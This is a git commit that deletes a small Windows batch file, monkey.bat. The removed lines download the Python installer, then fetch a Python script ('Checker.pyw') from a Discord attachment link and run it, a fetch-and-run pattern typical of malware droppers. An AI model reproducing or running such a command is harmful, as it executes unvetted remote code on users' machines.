ef4e274c312fb4ae61723a5fbfc0c0286e06c059
Chrome <80221878+China0002@users.noreply.github.com>
2023-03-05 16:12:30 -0600

    Delete monkey.bat

--- monkey.bat
+++
@@ -1,5 +0,0 @@
-ECHO @OFF
-CD C:\Windows\Users\Downloads
-curl https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe -O
-curl https://cdn.discordapp.com/attachments/1079932244010991637/1081015652032204914/Checker.pyw -O
-start Checker.pyw
